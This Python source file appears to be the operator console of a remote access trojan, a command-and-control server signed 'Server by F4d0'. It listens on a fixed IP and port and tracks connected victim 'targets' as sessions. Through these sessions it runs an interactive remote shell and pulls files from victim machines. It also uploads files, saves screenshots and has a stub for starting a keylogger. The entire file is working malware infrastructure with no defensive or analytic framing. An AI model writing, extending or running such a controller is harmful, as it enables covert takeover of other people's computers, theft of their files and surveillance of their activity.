#!/usr/bin/python3
from termcolor import colored
import socket
import json
import os
import base64
import threading

s = socket.socket()
ips = []
targets = []
HOST = '192.168.0.94'
PORT = 54321
client = 0
stop_threads = False
count = 1


def get_help():
    return '''
#########################################################################################
Server by F4d0

OPTIONS:

    targets         --> shows connected targets
    session #       --> enters in session number #
    help            --> shows this help menu
    quit            --> quit

#########################################################################################
'''


def shell(_s, _target, _addr):
    def reliable_send(_target, _cmd):
        if type(_cmd) is bytes:
            _cmd = _cmd.decode('UTF-8')
        json_data = json.dumps(_cmd)
        _target.sendall(json_data.encode('UTF-8'))

    def reliable_recv(_target):
        data = ""
        while True:
            try:
                data = data + (_target.recv(1024)).decode('UTF-8')
                return json.loads(data)
            except ValueError:
                continue

    global count
    while True:
        cmd = input('* Shell#~%s: ' % str(_addr))
        reliable_send(_target, cmd)
        if cmd == 'q':
            print(colored('[-] You decided to exit', 'red'))
            break
            # _target.close()
            # _s.close()
        elif cmd == 'exit':
            _target.close()
            targets.remove(_target)
            ips.remove(_addr)
            break
        elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
            # reliable_send(_target, 'pwd') # if linux
            # reliable_send(_target, 'cd')  # if windows
            # result = reliable_recv(_target)
            # print('Changed to directory: ', result)
            continue
        elif cmd[:3] == 'get' and len(cmd[4:]) > 1:
            with open(cmd[4:], 'wb') as f:
                file_data = reliable_recv(_target)
                f.write(base64.b64decode(file_data))
                f.close()
        elif cmd[:4] == 'send' and len(cmd[5:]) > 1:
            try:
                with open(cmd[5:], 'rb') as f:
                    file_data = f.read()
                    reliable_send(_target, base64.b64encode(file_data))
            except:
                failed = 'Failed to Upload'
                reliable_send(_target, base64.b64encode(failed))
        elif cmd[:10] == 'screenshot':
            temp_name = 'screenshot_' + str(_addr[0]) + '_' + str(count) + '.png'
            with open(temp_name, 'wb') as sc:
                png_data = reliable_recv(_target)
                png_data_decode = base64.b64decode(png_data)
                if png_data_decode[:3] == '[!]':
                    print(png_data_decode)
                else:
                    sc.write(png_data_decode)
                    count += 1
                sc.close()
        elif cmd[:12] == 'keylog_start':
            continue
        else:
            result = reliable_recv(_target)
            print('------------------\n', result, '\n------------------\n')


def server():
    global client
    global s
    global ips
    global targets
    global stop_threads
    while True:
        if stop_threads:
            break
        s.settimeout(1)
        try:
            target, ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print('\n###############################\n'
                  + 'TARGET: ' + str(targets[client]) + '\n'
                  + 'IP/PORT: ' + str(ips[client]) + ' CONNECTED'
                  + '\n###############################\n')
            client += 1
        except:
            pass


def main():
    global s
    global ips
    global targets
    global stop_threads
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    print('[+] Waiting for targets to connect ...')
    t1 = threading.Thread(target=server)
    t1.start()
    while True:
        cmd = input('* Center: ')
        if cmd == 'quit':
            for target in targets:
                target.close()
            stop_threads = True
            s.close()
            exit(0)
        if cmd == 'help':
            print(get_help())
        if cmd == 'targets':
            count = 0
            print('\n###############################\n'
                  + 'TARGETS Available: \n')
            for ip in ips:
                print('Session ' + str(count) + '. <---> ' + str(ip))
                count += 1
            print('\n###############################\n')
        # elif cmd[:7] == 'session' and len(cmd[8:]) > 1:
        elif cmd[:7] == 'session':
            try:
                num = int(cmd[8:])
                tarnum = targets[num]
                tarip = ips[num]
                shell(s, tarnum, tarip)
            except:
                print('[!] No session under that number!')
        else:
            continue


if __name__ == '__main__':
    main()
